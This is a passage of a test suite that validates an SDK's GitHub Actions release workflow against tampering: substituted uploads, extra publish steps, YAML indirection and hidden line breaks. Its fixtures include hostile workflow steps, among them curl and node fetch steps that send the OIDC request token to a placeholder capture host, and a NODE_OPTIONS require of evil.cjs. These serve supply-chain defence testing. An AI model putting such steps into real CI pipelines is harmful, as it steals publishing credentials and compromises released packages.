  });

  test('constructs provenance-enabled exact-tarball npm arguments', () => {
    expect(
      createNpmPublishArgs({
        tarball: '/tmp/pkg.tgz',
        access: 'public',
        distTag: 'latest',
        registry: 'https://registry.npmjs.org/',
        userconfig: '/tmp/user.npmrc',
        globalconfig: '/tmp/global.npmrc',
        cache: '/tmp/npm-cache',
      }),
    ).toEqual([
      'publish',
      '/tmp/pkg.tgz',
      '--access',
      'public',
      '--tag',
      'latest',
      '--provenance',
      '--ignore-scripts',
      '--registry=https://registry.npmjs.org/',
      '--userconfig=/tmp/user.npmrc',
      '--globalconfig=/tmp/global.npmrc',
      '--cache=/tmp/npm-cache',
    ]);
  });

  test('never invokes npm while publication is locked', () => {
    expect(() =>
      publishReleaseArtifacts({
        root: workspaceRoot,
        artifactRoot: '/tmp/missing-artifacts',
        version: '0.1.0',
        env: { OPENCOVEN_RELEASE_AUTHORIZATION: 'publish' },
        execute: () => {
          throw new Error('must not execute while locked');
        },
      }),
    ).toThrow(
      'Release publishing is disabled by release.config.json',
    );
  });

  test('requires the release workflow identity and a tag on HEAD', () => {
    const fixture = createReleaseFixture();
    rmSync(resolve(fixture, '.github/workflows/release.yml'));

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Required release workflow is missing: .github/workflows/release.yml',
    );
    expect(() =>
      validateReleaseReadiness({
        root: workspaceRoot,
        version: '0.1.0',
        tag: 'sdk-v0.1.0',
        requireTag: true,
      }),
    ).toThrow('Release tag sdk-v0.1.0 is absent');
  });

  test('requires the release tag to be an annotated tag object', () => {
    const annotatedFixture = createReleaseFixture();
    initializeReleaseFixtureRepository(annotatedFixture);
    git(annotatedFixture, [
      '-c',
      'tag.gpgSign=false',
      'tag',
      '--annotate',
      'sdk-v0.1.0',
      '--message',
      'SDK v0.1.0',
    ]);

    expect(() =>
      validateReleaseReadiness({
        root: annotatedFixture,
        version: '0.1.0',
        tag: 'sdk-v0.1.0',
        requireTag: true,
      }),
    ).not.toThrow();

    const lightweightFixture = createReleaseFixture();
    initializeReleaseFixtureRepository(lightweightFixture);
    git(lightweightFixture, ['tag', 'sdk-v0.1.0']);

    expect(() =>
      validateReleaseReadiness({
        root: lightweightFixture,
        version: '0.1.0',
        tag: 'sdk-v0.1.0',
        requireTag: true,
      }),
    ).toThrow('Release tag sdk-v0.1.0 must be an annotated tag object');
  });

  test('enforces the npm trusted-publisher environment on the final publish job', () => {
    const fixture = createReleaseFixture();
    const workflowPath = resolve(fixture, '.github/workflows/release.yml');
    const workflow = readFileSync(workflowPath, 'utf8').replace(
      '    environment: npm-publish\n',
      '',
    );
    writeFileSync(workflowPath, workflow);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /exact npm trusted-publisher environment/u,
    );
  });

  test('grants the publish job read-only deployment verification access', () => {
    const workflow = readFileSync(
      resolve(workspaceRoot, '.github/workflows/release.yml'),
      'utf8',
    );
    const publishJob = workflow.slice(workflow.indexOf('\n  publish:\n'));

    expect(publishJob).toContain('      deployments: read');
  });

  test('allows exactly one publication artifact upload in the candidate job', () => {
    const fixture = createReleaseFixture();
    const workflowPath = resolve(fixture, '.github/workflows/release.yml');
    const workflow = readFileSync(workflowPath, 'utf8');
    const uploadStep =
      '      - id: upload\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1';
    writeFileSync(
      workflowPath,
      workflow.replace(uploadStep, `${uploadStep}\n${uploadStep}`),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow candidate upload must be active and unconditional',
    );
  });

  test('rejects a disabled candidate upload substituted by a sibling local action', () => {
    const fixture = createReleaseFixture();
    const actionRoot = resolve(
      fixture,
      '.github/actions/upload-publication-candidate',
    );
    mkdirSync(actionRoot, { recursive: true });
    writeFileSync(
      resolve(actionRoot, 'action.yml'),
      [
        'name: Upload publication candidate',
        'runs:',
        '  using: composite',
        '  steps:',
        '    - uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a',
        '      with:',
        '        name: opencoven-sdk-publication-${{ github.sha }}-${{ inputs.version }}',
        '        path: .artifacts/publication',
        '',
      ].join('\n'),
    );
    updateReleaseWorkflow(
      fixture,
      '      - id: upload\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n',
      [
        '      - id: upload',
        '        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
        '        if: false',
        '',
      ].join('\n'),
    );
    appendRepositoryVerificationStep(
      fixture,
      [
        '      - name: Substitute publication candidate upload',
        '        uses: ./.github/actions/upload-publication-candidate',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow candidate upload must be active and unconditional',
    );
  });

  test.each([
    [
      'GitHub CLI artifact API',
      [
        '      - name: Substitute publication candidate upload',
        '        run: >-',
        '          gh api --method POST',
        '          repos/OpenCoven/sdk/actions/artifacts',
        '',
      ].join('\n'),
    ],
    [
      'curl artifact API',
      [
        '      - name: Substitute publication candidate upload',
        '        run: |',
        '          curl --fail-with-body --request POST \\',
        '            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/actions/artifacts"',
        '',
      ].join('\n'),
    ],
    [
      'secondary Node uploader',
      [
        '      - name: Substitute publication candidate upload',
        '        run: node ./.github/scripts/upload-publication-candidate.mjs',
        '',
      ].join('\n'),
    ],
  ])('rejects disabled candidate upload substitution through %s', (_label, step) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      '      - id: upload\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n',
      [
        '      - id: upload',
        '        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
        '        if: false',
        '',
      ].join('\n'),
    );
    appendRepositoryVerificationStep(fixture, step);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow candidate upload must be active and unconditional',
    );
  });

  test.each([
    'false',
    '${{ github.run_attempt == 1 }}',
  ])('rejects candidate upload condition %s', (condition) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      '      - id: upload\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n',
      [
        '      - id: upload',
        '        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
        `        if: ${condition}`,
        '',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow candidate upload must be active and unconditional',
    );
  });

  test('rejects an additional sibling local action while the canonical upload remains active', () => {
    const fixture = createReleaseFixture();
    appendRepositoryVerificationStep(
      fixture,
      [
        '      - name: Upload a sibling publication candidate',
        '        uses: ./.github/actions/upload-publication-candidate',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must use the exact frozen release job and step graph',
    );
  });

  test.each([
    [
      'GitHub CLI',
      '      - run: gh api repos/OpenCoven/sdk/actions/runs/1/artifacts\n',
    ],
    [
      'curl',
      [
        '      - run: |',
        '          curl --fail-with-body \\',
        '            "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/actions/artifacts"',
        '',
      ].join('\n'),
    ],
    [
      'secondary Node script',
      '      - run: node ./.github/scripts/upload-publication-candidate.mjs\n',
    ],
  ])('rejects an additional sibling artifact uploader through %s', (_label, step) => {
    const fixture = createReleaseFixture();
    appendRepositoryVerificationStep(fixture, step);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must use the exact frozen release job and step graph',
    );
  });

  test.each([
    'false',
    '${{ inputs.mode == \'verify\' && github.run_attempt == 1 }}',
  ])('rejects candidate creation condition %s', (condition) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      '      - name: Create immutable publication candidate\n',
      [
        '      - name: Create immutable publication candidate',
        `        if: ${condition}`,
        '',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow candidate creation must be active and unconditional',
    );
  });

  test('rejects candidate upload before candidate creation and verification', () => {
    const fixture = createReleaseFixture();
    const workflowPath = resolve(fixture, '.github/workflows/release.yml');
    const workflow = readFileSync(workflowPath, 'utf8');
    const createStart = workflow.indexOf(
      '      - name: Create immutable publication candidate\n',
    );
    const uploadStart = workflow.indexOf(
      '      - id: upload\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n',
      createStart,
    );
    const attestationStart = workflow.indexOf(
      '\n  publication-candidate-attestation:\n',
      uploadStart,
    );
    expect(createStart).toBeGreaterThan(-1);
    expect(uploadStart).toBeGreaterThan(createStart);
    expect(attestationStart).toBeGreaterThan(uploadStart);
    const createStep = workflow.slice(createStart, uploadStart);
    const uploadStep = workflow.slice(uploadStart, attestationStart);
    updateReleaseWorkflow(
      fixture,
      `${createStep}${uploadStep}`,
      `${uploadStep}${createStep}`,
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow candidate steps must use the exact reviewed order',
    );
  });

  test('rejects extra publication candidate artifact-name occurrences', () => {
    const fixture = createReleaseFixture();
    appendRepositoryVerificationStep(
      fixture,
      [
        '      - name: Substitute candidate artifact name',
        '        env:',
        '          SUBSTITUTE_NAME: opencoven-sdk-publication-${{ github.sha }}-${{ inputs.version }}',
        '        run: /usr/bin/true',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must contain only the reviewed publication candidate artifact-name bindings',
    );
  });

  test('uploads candidate bytes before isolated attestation', () => {
    const workflow = readFileSync(
      resolve(workspaceRoot, '.github/workflows/release.yml'),
      'utf8',
    );
    const candidateStart = workflow.indexOf('\n  publication-candidate:\n');
    const candidateAttestationStart = workflow.indexOf(
      '\n  publication-candidate-attestation:\n',
    );
    const approvalWitnessStart = workflow.indexOf('\n  approval-witness:\n');
    const publishStart = workflow.indexOf('\n  publish:\n');
    const candidateJob = workflow.slice(
      candidateStart,
      candidateAttestationStart,
    );
    const candidateAttestationJob = workflow.slice(
      candidateAttestationStart,
      approvalWitnessStart,
    );
    const publishJob = workflow.slice(publishStart);
    const createIndex = candidateJob.indexOf(
      'name: Create immutable publication candidate',
    );
    const uploadIndex = candidateJob.indexOf('uses: actions/upload-artifact@');

    expect(createIndex).toBeGreaterThan(-1);
    expect(uploadIndex).toBeGreaterThan(createIndex);
    expect(candidateJob).toContain('    environment: publication-candidate');
    expect(candidateJob).not.toContain('id-token: write');
    expect(candidateJob).not.toContain('uses: actions/attest@');
    expect(candidateAttestationJob).toContain('id-token: write');
    expect(candidateAttestationJob).toContain('uses: actions/attest@');
    expect(candidateAttestationJob).not.toContain('actions/checkout@');
    expect(publishJob).not.toContain('uses: actions/attest@');
  });

  test('rejects OIDC capability on the candidate-controlled build job', () => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      [
        '    environment: publication-candidate',
        '    outputs:',
        '      artifact-id: ${{ steps.upload.outputs.artifact-id }}',
        '      artifact-digest: ${{ steps.upload.outputs.artifact-digest }}',
        '    permissions:',
        '      actions: read',
        '      attestations: read',
        '      contents: read',
        '      deployments: read',
        '      issues: read',
        '    env:',
        '      RELEASE_VERSION: ${{ inputs.version }}',
      ].join('\n'),
      [
        '    environment: publication-candidate',
        '    outputs:',
        '      artifact-id: ${{ steps.upload.outputs.artifact-id }}',
        '      artifact-digest: ${{ steps.upload.outputs.artifact-digest }}',
        '    permissions:',
        '      actions: read',
        '      attestations: read',
        '      contents: read',
        '      deployments: read',
        '      id-token: write',
        '      issues: read',
        '    env:',
        '      RELEASE_VERSION: ${{ inputs.version }}',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /publication-candidate job must not receive unreviewed permissions/u,
    );
  });

  test.each([
    [
      'checkout',
      '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1\n',
    ],
    [
      'local action',
      '      - uses: ./.github/actions/attest-candidate\n',
    ],
    [
      'repository shell',
      [
        '      - name: Run candidate-controlled code',
        '        run: node ./tsup.config.ts',
        '',
      ].join('\n'),
    ],
  ])('rejects %s in an OIDC-bearing attestation job', (_label, replacement) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n',
      replacement,
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /candidate-attestation must use only the exact pinned official artifact and attestation actions/u,
    );
  });

  test.each([
    [
      'anchor',
      '    runs-on: ubuntu-latest\n',
      '    runs-on: &release-runner ubuntu-latest\n',
    ],
    [
      'alias',
      '    runs-on: ubuntu-latest\n',
      [
        '    x-runner: &release-runner ubuntu-latest',
        '    runs-on: *release-runner',
        '',
      ].join('\n'),
    ],
    [
      'merge key',
      '    runs-on: ubuntu-latest\n',
      [
        '    x-runner: &release-runner',
        '      runs-on: ubuntu-latest',
        '    <<: *release-runner',
        '    runs-on: ubuntu-latest',
        '',
      ].join('\n'),
    ],
  ])('rejects YAML %s graph indirection', (_label, search, replacement) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(fixture, search, replacement);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must not use YAML anchors, aliases, or merge keys',
    );
  });

  test.each([
    ['bare carriage return', '\r'],
    ['next-line separator', '\u0085'],
    ['Unicode line separator', '\u2028'],
    ['Unicode paragraph separator', '\u2029'],
  ])('rejects %s as a hidden YAML line break', (_label, lineBreak) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      '      - id: upload\n        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1\n        with:\n',
      [
        '      - id: upload',
        '        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1',
        '        env:',
        '          NODE_OPTIONS: --require ./evil.cjs',
      ].join(lineBreak) + '\n        with:\n',
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must use LF or CRLF line endings only',
    );
  });

  test.each([
    ['candidate', '    environment: publication-candidate'],
    ['approval-evidence', '    environment: npm-release'],
  ])('rejects Unicode whitespace in the %s environment name', (
    _label,
    environmentLine,
  ) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      `${environmentLine}\n`,
      `${environmentLine}\u00a0\n`,
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must contain ASCII text only',
    );
  });

  test.each([
    [
      'multiline artifact API shell',
      '              verify:repository\n',
      [
        '              verify:repository',
        '          gh api repos/OpenCoven/sdk/actions/runs/1/artifacts',
        '',
      ].join('\n'),
    ],
    [
      'local composite action',
      '      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0\n',
      '      - uses: ./.github/actions/setup-and-upload\n',
    ],
    [
      'dynamic action expression',
      '      - uses: actions/setup-node@820762786026740c76f36085b0efc47a31fe5020 # v7.0.0\n',
      '      - uses: ${{ vars.RELEASE_SETUP_ACTION }}\n',
    ],
    [
      'reusable workflow key',
      '    runs-on: ubuntu-latest\n',
      [
        '    uses: ./.github/workflows/reusable-release.yml',
        '    runs-on: ubuntu-latest',
        '',
      ].join('\n'),
    ],
  ])('rejects %s while preserving the visible step count', (
    _label,
    search,
    replacement,
  ) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(fixture, search, replacement);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must use the exact frozen release job and step graph',
    );
  });

  test('rejects an appended npm publish step in the OIDC-bearing publish job', () => {
    const fixture = createReleaseFixture();
    appendPublishWorkflowStep(
      fixture,
      [
        '      - name: Publish unreviewed bytes',
        '        run: npm publish ./unreviewed.tgz --provenance',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /Release workflow (?:publish job must use only the exact reviewed ordered steps|must use the exact frozen release job and step graph)/u,
    );
  });

  test.each([
    [
      'curl',
      [
        '      - name: Exfiltrate OIDC request credentials',
        '        run: |',
        '          curl --fail-with-body \\',
        '            -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \\',
        '            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://capture.example.invalid"',
      ].join('\n'),
    ],
    [
      'secondary Node script',
      [
        '      - name: Exfiltrate OIDC request credentials',
        '        run: >-',
        '          node -e',
        '          \'fetch(process.env.ACTIONS_ID_TOKEN_REQUEST_URL,',
        '          {headers:{authorization:`Bearer ${process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN}`}})\'',
      ].join('\n'),
    ],
  ])('rejects appended OIDC token exfiltration through %s', (_label, step) => {
    const fixture = createReleaseFixture();
    appendPublishWorkflowStep(fixture, step);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /Release workflow (?:publish job must use only the exact reviewed ordered steps|must use the exact frozen release job and step graph)/u,
    );
  });

  test.each([
    [
      'secondary artifact download',
      [
        '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c',
        '        with:',
        '          name: unrelated',
        '          path: .artifacts/unrelated',
      ].join('\n'),
    ],
    [
      'local action',
      [
        '      - name: Local publisher',
        '        uses: ./.github/actions/publish',
      ].join('\n'),
    ],
    [
      'secondary Node publisher',
      [
        '      - name: Secondary publisher',
        '        run: node ./scripts/secondary-publish.mjs',
      ].join('\n'),
    ],
    [
      'GitHub CLI command',
      [
        '      - name: Request another artifact',
        '        run: gh run download 10000 --name unrelated',
      ].join('\n'),
    ],
    [
      'conditional shell step',
      [
        '      - name: Conditional publisher',
        '        if: ${{ github.run_attempt == 1 }}',
        '        run: npm publish ./unreviewed.tgz',
      ].join('\n'),
    ],
  ])('rejects extra publish execution through %s', (_label, step) => {
    const fixture = createReleaseFixture();
    appendPublishWorkflowStep(fixture, step);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /Release workflow (?:publish job must use only the exact reviewed ordered steps|must use the exact frozen release job and step graph)/u,
    );
  });

  test('rejects conditionally disabled reviewed publish steps', () => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      '      - name: Publish exact reviewed release artifacts\n',
      [
        '      - name: Publish exact reviewed release artifacts',
        '        if: false',
        '',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /Release workflow (?:publish job must use only the exact reviewed ordered steps|must use the exact frozen release job and step graph)/u,
    );
  });

  test('rejects reordered authorization and artifact download steps', () => {
    const fixture = createReleaseFixture();
    const workflowPath = resolve(fixture, '.github/workflows/release.yml');
    const workflow = readFileSync(workflowPath, 'utf8');
    const publishStart = workflow.indexOf('\n  publish:\n');
    const authorizationStart = workflow.indexOf(
      '      - name: Resolve exact publication authorization\n',
      publishStart,
    );
    const downloadStart = workflow.indexOf(
      '      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8.0.1\n',
      authorizationStart,
    );
    const verificationStart = workflow.indexOf(
      '      - name: Verify exact reviewed publication bytes\n',
      downloadStart,
    );
    expect(authorizationStart).toBeGreaterThan(publishStart);
    expect(downloadStart).toBeGreaterThan(authorizationStart);
    expect(verificationStart).toBeGreaterThan(downloadStart);
    const authorizationStep = workflow.slice(
      authorizationStart,
      downloadStart,
    );
    const downloadStep = workflow.slice(downloadStart, verificationStart);
    updateReleaseWorkflow(
      fixture,
      `${authorizationStep}${downloadStep}`,
      `${downloadStep}${authorizationStep}`,
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /Release workflow (?:publish job must use only the exact reviewed ordered steps|must use the exact frozen release job and step graph)/u,
    );
  });

  test('rejects extra commands inside the reviewed sterile publisher step', () => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      '            "$node_path" ./scripts/publish-release-artifacts.mjs \\\n              --artifact-root .artifacts/publication \\\n',
      [
        '            "$node_path" ./scripts/secondary-publish.mjs && \\',
        '            "$node_path" ./scripts/publish-release-artifacts.mjs \\',
        '              --artifact-root .artifacts/publication \\',
        '',
      ].join('\n'),
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /Release workflow (?:publish job must use only the exact reviewed ordered steps|must use the exact frozen release job and step graph)/u,
    );
  });

  test.each([
    [
      'candidate creation command',
      '            "$node_path" ./scripts/create-release-artifacts.mjs \\\n              --output .artifacts/publication \\\n',
      [
        '            "$node_path" ./scripts/secondary-uploader.mjs && \\',
        '            "$node_path" ./scripts/create-release-artifacts.mjs \\',
        '              --output .artifacts/publication \\',
        '',
      ].join('\n'),
    ],
    [
      'candidate upload path',
      '          path: .artifacts/publication\n          if-no-files-found: error\n',
      [
        '          path: .artifacts/substituted-publication',
        '          if-no-files-found: error',
        '',
      ].join('\n'),
    ],
    [
      'candidate attestation subjects',
      '            ${{ runner.temp }}/opencoven-publication-candidate/tarballs/**/*.tgz\n',
      '            ${{ runner.temp }}/opencoven-publication-candidate/substituted/**/*.tgz\n',
    ],
  ])('rejects substituted %s with the same candidate step count', (
    _label,
    search,
    replacement,
  ) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(fixture, search, replacement);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /Release workflow (?:publication-candidate|candidate-attestation) job must use only the exact reviewed ordered steps/u,
    );
  });

  test.each([
    [
      'preflight shell',
      '          echo "Releases must run from main." >&2\n          exit 1\n',
      [
        '          node ./scripts/secondary-release-check.mjs',
        '          echo "Releases must run from main." >&2',
        '          exit 1',
        '',
      ].join('\n'),
    ],
    [
      'repository verification shell',
      '            "$node_path" "$corepack_path" pnpm@10.34.0 \\\n              --config.pnpmfile=/dev/null \\\n',
      [
        '            "$node_path" ./scripts/secondary-release-check.mjs && \\',
        '            "$node_path" "$corepack_path" pnpm@10.34.0 \\',
        '              --config.pnpmfile=/dev/null \\',
        '',
      ].join('\n'),
    ],
    [
      'repository job container',
      '  repository-verification:\n    runs-on: ubuntu-latest\n',
      [
        '  repository-verification:',
        '    runs-on: ubuntu-latest',
        '    container: ghcr.io/example/unreviewed:latest',
        '',
      ].join('\n'),
    ],
  ])('rejects substituted %s in the frozen verification jobs', (
    _label,
    search,
    replacement,
  ) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(fixture, search, replacement);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must use the exact frozen release job and step graph',
    );
  });

  test.each([
    [
      'workflow_call',
      [
        '  workflow_call:',
        '    inputs:',
        '      mode:',
        '        required: true',
        '        type: string',
      ].join('\n'),
    ],
    [
      'push',
      [
        '  push:',
        '    branches: [main]',
      ].join('\n'),
    ],
  ])('rejects the additional %s release entry point', (_label, trigger) => {
    const fixture = createReleaseFixture();
    updateReleaseWorkflow(
      fixture,
      'on:\n  workflow_dispatch:\n',
      `on:\n${trigger}\n  workflow_dispatch:\n`,
    );

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow must use only the exact reviewed dispatch controls',
    );
  });

  test('enforces authoritative evidence access in the preflight workflow job', () => {
    const fixture = createReleaseFixture();
    const workflowPath = resolve(fixture, '.github/workflows/release.yml');
    const workflow = readFileSync(workflowPath, 'utf8').replace(
      '      attestations: read',
      '      attestations: none',
    );
    writeFileSync(workflowPath, workflow);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      'Release workflow preflight job must contain attestations: read',
    );

    const actionsFixture = createReleaseFixture();
    const actionsWorkflowPath = resolve(
      actionsFixture,
      '.github/workflows/release.yml',
    );
    const actionsWorkflow = readFileSync(actionsWorkflowPath, 'utf8').replace(
      '      actions: read',
      '      actions: none',
    );
    writeFileSync(actionsWorkflowPath, actionsWorkflow);

    expect(() => validateReleaseReadiness({ root: actionsFixture })).toThrow(
      'Release workflow preflight job must contain actions: read',
    );

    const tokenFixture = createReleaseFixture();
    const tokenWorkflowPath = resolve(
      tokenFixture,
      '.github/workflows/release.yml',
    );
    const tokenWorkflow = readFileSync(tokenWorkflowPath, 'utf8').replace(
      '          GH_TOKEN: ${{ github.token }}',
      '          GH_TOKEN: ${{ secrets.LONG_LIVED_TOKEN }}',
    );
    writeFileSync(tokenWorkflowPath, tokenWorkflow);

    expect(() => validateReleaseReadiness({ root: tokenFixture })).toThrow(
      'Release workflow step Verify authoritative conformance evidence must use the standard GitHub workflow token',
    );

    const verificationTokenFixture = createReleaseFixture();
    const verificationTokenWorkflowPath = resolve(
      verificationTokenFixture,
      '.github/workflows/release.yml',
    );
    const verificationTokenWorkflow = readFileSync(
      verificationTokenWorkflowPath,
      'utf8',
    ).replace(
      '      - name: Verify repository\n        shell:',
      '      - name: Verify repository\n        env:\n          GH_TOKEN: ${{ github.token }}\n        shell:',
    );
    writeFileSync(
      verificationTokenWorkflowPath,
      verificationTokenWorkflow,
    );

    expect(() =>
      validateReleaseReadiness({ root: verificationTokenFixture }),
    ).toThrow(
      'Release workflow repository verification must not receive GH_TOKEN',
    );
  });

  test('does not accept publish protections copied into a run block', () => {
    const fixture = createReleaseFixture();
    const workflowPath = resolve(fixture, '.github/workflows/release.yml');
    const original = readFileSync(workflowPath, 'utf8');
    const publishMarker = '\n  publish:\n';
    const publishIndex = original.indexOf(publishMarker);
    expect(publishIndex).toBeGreaterThan(0);
    const workflow = `${original.slice(0, publishIndex)}${publishMarker}${[
      "    if: inputs.mode == 'publish'",
      '    runs-on: ubuntu-latest',
      '    steps:',
      '      - name: Decoy publish protections',
      '        run: |',
      '          echo "needs: preflight"',
      '          echo "environment: npm-release"',
      '          echo "contents: read"',
      '          echo "id-token: write"',
      '          echo "attestations: write"',
      '',
    ].join('\n')}`;
    writeFileSync(workflowPath, workflow);
    expect(
      [
        'needs: preflight',
        'environment: npm-release',
        'contents: read',
        'id-token: write',
        'attestations: write',
      ].every((value) => workflow.includes(value)),
    ).toBe(true);

    expect(() => validateReleaseReadiness({ root: fixture })).toThrow(
      /Release workflow (?:publish job must use the exact npm trusted-publisher environment|must use the exact frozen release job and step graph)/u,
    );
  });
});
